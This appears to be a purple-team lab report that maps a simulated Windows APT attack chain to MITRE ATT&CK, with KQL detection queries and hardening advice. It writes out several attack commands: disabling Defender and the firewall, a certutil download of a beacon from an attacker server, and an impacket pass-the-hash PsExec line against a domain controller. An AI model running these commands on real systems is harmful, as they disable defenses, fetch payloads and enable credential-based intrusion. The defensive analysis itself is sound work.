# MITRE ATT&CK Mapping – APT Attack Chain Simulation

This document maps each phase of the simulated APT attack to the MITRE ATT&CK Enterprise framework for Windows. It provides a consolidated view of tactics, techniques, procedures (TTPs), and detection opportunities observed throughout the attack chain.

---

# 1. Attack Chain Overview

| Phase | Attack Action | MITRE Tactic | Technique ID | Technique Name |
|--------|--------------|--------------|--------------|----------------|
| Phase 2 | Reverse shell execution (`shell.exe`) | Execution | T1204.002 | User Execution: Malicious File |
| Phase 2 | Command-line execution (`cmd.exe`) | Execution | T1059.003 | Windows Command Shell |
| Phase 3 | Scheduled task creation (`Updater`) | Persistence | T1053.005 | Scheduled Task |
| Phase 4 | UAC bypass (`eventvwr.exe` → `cmd.exe`) | Privilege Escalation | T1548.002 | Bypass User Account Control |
| Phase 4 | Meterpreter `getsystem` | Privilege Escalation | T1134.001 | Token Impersonation/Theft |
| Phase 5 | LSASS credential dumping | Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory |
| Phase 6 | Pass-the-Hash authentication | Lateral Movement | T1550.002 | Pass the Hash |
| Phase 6 | PsExec over SMB | Lateral Movement | T1021.002 | SMB/Windows Admin Shares |
| Phase 7 | HTTP Beacon | Command & Control | T1071.001 | Application Layer Protocol: Web Protocols |
| Phase 7 | `certutil.exe` payload download | Defense Evasion | T1218.008 | Signed Binary Proxy Execution: Certutil |
| Phase 2 / 7 | Defender and Firewall modification | Defense Evasion | T1562.001 / T1562.004 | Impair Defenses |

---

# 2. Initial Access (TA0001)

## T1204.002 – User Execution: Malicious File

The attacker manually executed `shell.exe` on the WS1 workstation after placing the payload in `C:\Users\Public`.

### Detection Opportunities

- Windows Security Event ID 4688
- File creation monitoring
- Execution from `C:\Users\Public`
- Unexpected executable launched by `cmd.exe`

Example KQL:

```kql
event.code:4688 AND process.name:shell.exe
```

---

# 3. Execution (TA0002)

## T1059.003 – Windows Command Shell

`cmd.exe` executed multiple attacker-controlled binaries including:

- `shell.exe`
- `beacon.exe`
- `certutil.exe`

### Detection Opportunities

- Event ID 4688
- Parent-child process analysis
- Suspicious command lines

Example KQL:

```kql
event.code:4688 AND process.name:cmd.exe
```

---

## T1204.002 – User Execution

Manual execution of attacker payloads initiated the compromise.

Indicators include:

- Execution from `C:\Users\Public`
- Immediate outbound network activity
- Unsigned executable launched from uncommon directory

---

# 4. Persistence (TA0003)

## T1053.005 – Scheduled Task

The attacker created a scheduled task named `Updater` that executes:

```
C:\Users\Public\shell.exe
```

daily at 09:00.

### Detection Opportunities

- Security Event 4698
- Task Scheduler Operational Log
- `schtasks.exe` process execution

Example KQL:

```kql
event.code:4698 AND winlog.event_data.TaskName:Updater
```

---

# 5. Privilege Escalation (TA0004)

## T1548.002 – Bypass User Account Control

`eventvwr.exe` was abused to launch an elevated `cmd.exe` without prompting the user.

### Detection Opportunities

- `eventvwr.exe` spawning `cmd.exe`
- High integrity process creation
- Registry modifications associated with UAC bypass

Example KQL:

```kql
event.code:4688 AND parent.process.name:eventvwr.exe AND process.name:cmd.exe
```

---

## T1134.001 – Token Impersonation/Theft

After elevation, Meterpreter `getsystem` impersonated the SYSTEM token.

### Detection Opportunities

- Sysmon Event 10
- Token manipulation behavior
- Named pipe impersonation
- High integrity transitions

---

# 6. Defense Evasion (TA0005)

## T1562.001 – Disable Windows Defender

PowerShell commands disabled Defender real-time monitoring.

Example:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Detection

- Defender Event 5007
- PowerShell Event 4104
- Script block logging

---

## T1562.004 – Disable Windows Firewall

Firewall profiles were disabled.

Example:

```powershell
Set-NetFirewallProfile -All -Enabled False
```

### Detection

- Firewall configuration events
- PowerShell logging
- Administrative configuration changes

---

## T1218.008 – Signed Binary Proxy Execution (Certutil)

`certutil.exe` downloaded `beacon.exe` from the attacker HTTP server.

Example:

```cmd
certutil -urlcache -f http://192.168.1.5:8080/beacon.exe C:\Users\Public\beacon.exe
```

### Detection

- Event 4688
- `certutil.exe` with `-urlcache`
- HTTP download of executable files

Example KQL:

```kql
event.code:4688 AND process.name:certutil.exe AND command.line:*urlcache*
```

---

# 7. Credential Access (TA0006)

## T1003.001 – LSASS Memory

The attacker loaded Meterpreter's Kiwi extension and extracted credentials directly from LSASS memory.

Extracted account:

| User | Domain | Credential |
|------|---------|------------|
| Administrator | NATION | NTLM Hash |

### Detection Opportunities

- Security Event 4663
- Sysmon Event 10
- LSASS handle requests
- `GrantedAccess = 0x1FFFFF`

Example KQL:

```kql
event.code:10 AND winlog.event_data.TargetImage:*lsass.exe
```

---

# 8. Lateral Movement (TA0008)

## T1550.002 – Pass the Hash

The extracted NTLM hash was reused to authenticate to the Domain Controller using Impacket PsExec.

Example:

```bash
impacket-psexec -hashes :<NTLM_HASH> nation/administrator@192.168.1.10
```

### Detection Opportunities

- Event 4624
- Logon Type 3
- NTLM authentication
- Unexpected source IP

Example KQL:

```kql
event.code:4624 AND winlog.event_data.LogonType:3
```

---

## T1021.002 – SMB / Windows Admin Shares

PsExec uploaded `PSEXESVC.exe`, installed a temporary service, and launched a remote shell.

### Detection Opportunities

- Event 5140
- Event 7045
- Event 4688
- File creation in `C:\Windows\Temp`

Example KQL:

```kql
event.code:7045 AND winlog.event_data.ServiceName:PSEXESVC
```

---

# 9. Command and Control (TA0011)

## T1071.001 – HTTP Beacon

`beacon.exe` communicated with the Kali C2 server over HTTP on port 8081.

### Detection Opportunities

- Sysmon Event 3
- Outbound HTTP connections
- Repeated periodic callbacks
- `beacon.exe` network activity

Example KQL:

```kql
event.code:3 AND destination.port:8081 AND process.name:beacon.exe
```

---

## Reverse TCP Session

The initial Meterpreter payload (`shell.exe`) connected back to the attacker using TCP port 4444.

Example KQL:

```kql
event.code:3 AND destination.port:4444 AND process.name:shell.exe
```

---

# 10. Detection Coverage Summary

| MITRE Tactic | Status | Primary Evidence |
|--------------|--------|-----------------|
| Initial Access | Detected | Event 4688 |
| Execution | Detected | Event 4688 |
| Persistence | Detected | Event 4698 |
| Privilege Escalation | Detected | Event 4688, Sysmon 10 |
| Defense Evasion | Detected | Events 5007, 4104, 4688 |
| Credential Access | Detected | Event 4663, Sysmon 10 |
| Lateral Movement | Detected | Events 4624, 4672, 5140, 7045 |
| Command & Control | Detected | Sysmon Event 3 |

---

# 11. Example Detection Queries

## Malware Execution

```kql
event.code:4688 AND process.name:shell.exe
```

## Scheduled Task Creation

```kql
event.code:4698
```

## LSASS Access

```kql
event.code:10 AND winlog.event_data.TargetImage:*lsass.exe
```

## Pass-the-Hash Logon

```kql
event.code:4624 AND winlog.event_data.LogonType:3
```

## PsExec Service Installation

```kql
event.code:7045 AND winlog.event_data.ServiceName:PSEXESVC
```

## Certutil Download

```kql
event.code:4688 AND process.name:certutil.exe
```

## HTTP Beacon

```kql
event.code:3 AND destination.port:8081
```

---

# 12. ATT&CK Coverage Matrix

| Tactic | Techniques |
|----------|------------|
| TA0001 – Initial Access | T1204.002 |
| TA0002 – Execution | T1059.003, T1204.002 |
| TA0003 – Persistence | T1053.005 |
| TA0004 – Privilege Escalation | T1548.002, T1134.001 |
| TA0005 – Defense Evasion | T1562.001, T1562.004, T1218.008 |
| TA0006 – Credential Access | T1003.001 |
| TA0008 – Lateral Movement | T1550.002, T1021.002 |
| TA0011 – Command & Control | T1071.001 |

---

# 13. Recommendations

- Enable Sysmon Event IDs 1, 3, 10, and 11 across all endpoints.
- Enable PowerShell Script Block Logging (Event 4104).
- Alert on execution from `C:\Users\Public` and `%TEMP%`.
- Monitor Event ID 7045 for unexpected service creation.
- Detect LSASS access by non-system processes.
- Restrict NTLM usage and prefer Kerberos authentication.
- Enable Windows Defender Credential Guard where possible.
- Block unauthorized outbound connections to uncommon ports such as 4444 and 8081.
- Use application control solutions such as AppLocker or WDAC to prevent execution of untrusted binaries.

---

# 14. Conclusion

This APT simulation demonstrates a complete attack chain spanning execution, persistence, privilege escalation, defense evasion, credential access, lateral movement, and command and control. Each stage produces forensic artifacts in Windows Security Logs, Sysmon, and network telemetry that can be leveraged by SIEM platforms and EDR solutions for rapid detection and incident response.

The most valuable detection opportunities observed during the simulation include:

- Process execution from `C:\Users\Public`
- LSASS memory access attempts
- Scheduled task creation
- NTLM network logons from unexpected hosts
- PsExec service installation
- `certutil.exe` downloading executable files
- Repeated HTTP beacon traffic to external infrastructure

Together, these detections provide strong visibility into attacker behavior and enable effective threat hunting and incident response.